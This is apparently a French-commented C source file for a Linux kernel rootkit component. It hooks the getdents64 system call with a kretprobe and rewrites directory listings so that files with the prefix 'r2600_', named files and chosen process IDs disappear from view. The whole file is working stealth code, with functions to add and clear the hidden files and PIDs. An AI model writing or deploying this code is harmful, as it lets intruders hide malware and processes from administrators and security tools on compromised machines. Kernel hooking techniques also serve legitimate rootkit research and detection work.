#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/string.h>
#include <linux/spinlock.h>
#include "hide_file.h"

#define PREFIX "r2600_"

static DEFINE_SPINLOCK(hide_lock);

static pid_t  hidden_pids[MAX_HIDDEN_PIDS];
static int    hidden_pids_count = 0;

static char   hidden_files[MAX_HIDDEN_FILES][256];
static int    hidden_files_count = 0;

struct probe_data {
    struct linux_dirent64 __user *dirp;
};

static int entry_getdents64(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct probe_data *d = (struct probe_data *)ri->data;
    const struct pt_regs *sys_regs = (const struct pt_regs *)regs->di;
    d->dirp = (struct linux_dirent64 __user *)sys_regs->si;
    return 0;
}

static int ret_getdents64(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct probe_data *d = (struct probe_data *)ri->data;
    long ret             = regs_return_value(regs);
    struct linux_dirent64 *kbuf, *curr, *prev;
    char pid_str[16];
    long offset;
    int hide, i;
    unsigned long flags;

    if (ret <= 0 || !d->dirp)
        return 0;

    kbuf = kmalloc(ret, GFP_KERNEL);
    if (!kbuf)
        return 0;

    if (copy_from_user(kbuf, d->dirp, ret)) {
        kfree(kbuf);
        return 0;
    }

    offset = 0;
    prev   = NULL;

    while (offset < ret) {
        curr = (struct linux_dirent64 *)((char *)kbuf + offset);
        hide = 0;

        if (strncmp(curr->d_name, PREFIX, strlen(PREFIX)) == 0)
            hide = 1;

        spin_lock_irqsave(&hide_lock, flags);

        for (i = 0; i < hidden_files_count && !hide; i++) {
            if (strcmp(curr->d_name, hidden_files[i]) == 0)
                hide = 1;
        }

        for (i = 0; i < hidden_pids_count && !hide; i++) {
            snprintf(pid_str, sizeof(pid_str), "%d", hidden_pids[i]);
            if (strcmp(curr->d_name, pid_str) == 0)
                hide = 1;
        }

        spin_unlock_irqrestore(&hide_lock, flags);

        if (hide) {
            if (prev) {
                prev->d_reclen += curr->d_reclen;
            } else {
                memmove(curr, (char *)curr + curr->d_reclen,
                        ret - offset - curr->d_reclen);
                ret -= curr->d_reclen;
                continue;
            }
        } else {
            prev = curr;
        }

        offset += curr->d_reclen;
    }

    if (copy_to_user(d->dirp, kbuf, ret))
        printk(KERN_ERR "copy_to_user a foiré\n");

    kfree(kbuf);
    regs->ax = ret;
    return 0;
}

static struct kretprobe krp = {
    .handler        = ret_getdents64,
    .entry_handler  = entry_getdents64,
    .data_size      = sizeof(struct probe_data),
    .maxactive      = 20,
    .kp.symbol_name = "__x64_sys_getdents64",
};

void set_hidden_pid(pid_t pid)
{
    unsigned long flags;

    spin_lock_irqsave(&hide_lock, flags);
    if (hidden_pids_count < MAX_HIDDEN_PIDS) {
        hidden_pids[hidden_pids_count++] = pid;
        printk(KERN_INFO "pid %d caché (%d/16)\n", pid, hidden_pids_count);
    } else {
        printk(KERN_WARNING "liste pids pleine\n");
    }
    spin_unlock_irqrestore(&hide_lock, flags);
}

void clear_hidden_pids(void)
{
    unsigned long flags;

    spin_lock_irqsave(&hide_lock, flags);
    hidden_pids_count = 0;
    printk(KERN_INFO "liste pids vidée\n");
    spin_unlock_irqrestore(&hide_lock, flags);
}

void set_hidden_file(const char *name)
{
    unsigned long flags;

    spin_lock_irqsave(&hide_lock, flags);
    if (hidden_files_count < MAX_HIDDEN_FILES) {
        strncpy(hidden_files[hidden_files_count], name, 255);
        hidden_files[hidden_files_count][255] = '\0';
        hidden_files_count++;
        printk(KERN_INFO "fichier %s caché (%d/16)\n", name, hidden_files_count);
    } else {
        printk(KERN_WARNING "liste fichiers pleine\n");
    }
    spin_unlock_irqrestore(&hide_lock, flags);
}

void clear_hidden_files(void)
{
    unsigned long flags;

    spin_lock_irqsave(&hide_lock, flags);
    hidden_files_count = 0;
    printk(KERN_INFO "liste fichiers vidée\n");
    spin_unlock_irqrestore(&hide_lock, flags);
}

int hide_file_init(void)
{
    int ret = register_kretprobe(&krp);
    if (ret < 0) {
        printk(KERN_ERR "kretprobe getdents64 échoué: %d\n", ret);
        return ret;
    }
    printk(KERN_INFO "getdents64 hookée\n");
    return 0;
}

void hide_file_exit(void)
{
    unregister_kretprobe(&krp);
    printk(KERN_INFO "getdents64 remis en place\n");
}
